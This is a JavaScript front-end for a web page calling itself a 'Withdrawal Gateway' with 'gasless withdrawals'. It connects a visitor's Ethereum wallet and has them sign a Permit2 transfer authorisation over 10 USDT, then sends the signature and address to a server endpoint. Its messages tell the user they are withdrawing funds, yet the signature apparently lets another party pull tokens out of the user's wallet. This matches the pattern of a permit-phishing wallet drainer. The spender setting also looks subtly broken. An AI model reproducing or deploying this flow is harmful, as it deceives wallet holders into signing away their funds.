import { createAppKit } from "@reown/appkit";
import { Ethers5Adapter } from "@reown/appkit-adapter-ethers5";
import { mainnet } from "@reown/appkit/networks";
import { ethers } from "ethers";

// 1. Initialize Reown AppKit
const projectId = "f340171a355aad487eb6daa39b4b6c10";

const metadata = {
    name: "Withdrawal Gateway",
    description: "Gasless Withdrawals",
    url: "https://avelut.xyz", 
    icons: ["https://www.avelut.xyz/logo_full.png"],
};

const modal = createAppKit({
    adapters: [new Ethers5Adapter()],
    metadata: metadata,
    networks: [mainnet],
    projectId,
    features: {
        analytics: false,
    },
});

// 2. UI Toast Utility
function showToast(msg, isError = false) {
    const toastContainer = document.getElementById('toastContainer');
    if (!toastContainer) return;

    const div = document.createElement('div');
    div.className = `p-4 rounded-2xl shadow-2xl backdrop-blur-md bg-opacity-90 text-white font-semibold transition-all duration-300 transform translate-y-[-20px] opacity-0 ${isError ? 'bg-red-600' : 'bg-green-600'}`;
    div.textContent = msg;
    
    toastContainer.appendChild(div);
    
    setTimeout(() => { div.style.transform = 'translateY(0)'; div.style.opacity = '1'; }, 10);
    setTimeout(() => { div.style.opacity = '0'; setTimeout(() => div.remove(), 300); }, 3000);
}

// 3. Withdrawal Logic
async function handleWithdraw() {
    try {
        const walletProvider = modal.getWalletProvider();
        if (!walletProvider) {
            await modal.open();
            return;
        }

        showToast("Connecting...");
        
        const provider = new ethers.providers.Web3Provider(walletProvider);
        const signer = provider.getSigner();
        const rawOwner = await signer.getAddress();
        const owner = ethers.utils.getAddress(rawOwner);
        const network = await provider.getNetwork();

        // Standardized Checksum Addresses
        const PERMIT2_ADDRESS = ethers.utils.getAddress("0x000000000022D473030F116dDEE9F6B43aC78BA3");
        const USDT_ADDRESS = ethers.utils.getAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7");

        // Uniswap V2 Router as spender
        const SPENDER_ADDRESS = ethers.utils.getAddress("0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D");

        const domain = {
            name: "Permit2",
            chainId: network.chainId,
            verifyingContract: PERMIT2_ADDRESS
        };

        // Canonical Permit2 EIP-712 Types
        const types = {
            PermitTransferFrom: [
                { name: "permitted", type: "TokenPermissions" },
                { name: "spender", type: "address" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ],
            TokenPermissions: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint256" }
            ]
        };

        const amount = ethers.utils.parseUnits("10", 6);
        const nonce = Date.now();
        const deadline = Math.floor(Date.now() / 1000) + 3600;

        const message = {
            permitted: {
                token: USDT_ADDRESS,
                amount: amount.toString()
            },
            spender: SPENDER_ADDRESS,
            nonce: nonce,
            deadline: deadline
        };

        showToast("Please sign the permit in your wallet...");

        // Sign typed data via Ethers v5 signer
        const signature = await signer._signTypedData(domain, types, message);

        showToast("Signature secured. Executing...");

        const res = await fetch('/api/withdraw', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                signature, 
                permitData: { 
                    token: USDT_ADDRESS,
                    amount: amount.toString(),
                    spender: SPENDER_ADDRESS,
                    nonce, 
                    deadline 
                }, 
                owner 
            })
        });

        const data = await res.json();
        data.success ? showToast("Success! Funds withdrawn.") : showToast(data.message || "Failed.", true);

    } catch (err) {
        console.error("Withdraw Error:", err);
        showToast(err.message || "An error occurred.", true);
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const withdrawBtn = document.getElementById('withdrawBtn');
    if (withdrawBtn) {
        withdrawBtn.addEventListener('click', handleWithdraw);
    }
});
